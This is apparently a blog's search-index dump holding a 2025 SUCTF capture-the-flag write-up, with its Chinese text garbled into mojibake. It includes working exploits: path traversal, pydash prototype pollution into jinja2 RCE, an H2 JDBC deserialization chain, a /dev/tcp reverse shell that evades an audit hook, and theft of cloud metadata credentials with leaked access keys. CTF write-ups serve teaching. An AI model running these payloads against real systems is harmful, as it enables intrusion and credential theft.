\u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : 